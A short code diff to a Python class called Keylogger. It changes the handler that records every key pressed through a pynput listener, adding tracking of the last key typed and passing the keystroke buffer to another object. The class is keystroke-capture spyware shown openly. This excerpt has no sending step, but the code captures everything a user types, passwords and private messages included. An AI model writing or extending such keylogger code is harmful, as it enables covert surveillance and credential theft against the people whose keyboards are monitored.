@@ -27,14 +27,17 @@ class Keylogger:
 
     # this function is called whenever a key is pressed on keyboard ( with help of listener)
     def on_press(self, key):
+        last_key = ''
         if str(key)[
             0] is '\'':  # if a normal key is pressed like 's' ---> we save s instead of 's' (removing first and last letter)
-            self.input_buffer += str(key)[1:-1]
+            last_key = str(key)[1:-1]
+            self.input_buffer += last_key
         elif str(key)[0] is '<':  # we don't need numbers on right of keyboard
             pass
         else:
-            self.input_buffer += str(key).replace('_', '.').split(".")[1]  # example: Key.ctrl_l --> ctrl
-        self.subject.set_buffer(self.input_buffer)
+            last_key = str(key).replace('_', '.').split(".")[1]  # example: Key.ctrl_l --> ctrl
+            self.input_buffer += last_key
+        self.subject.set_buffer_key(self.input_buffer, last_key)
 
     # our main function that starts when we run our code
     def start(self):
@@ -43,3 +46,5 @@ class Keylogger:
         with Listener(
                 on_press=self.on_press) as listener:  # listener to listen key pressing and calling on_press function
             listener.join()
+
+
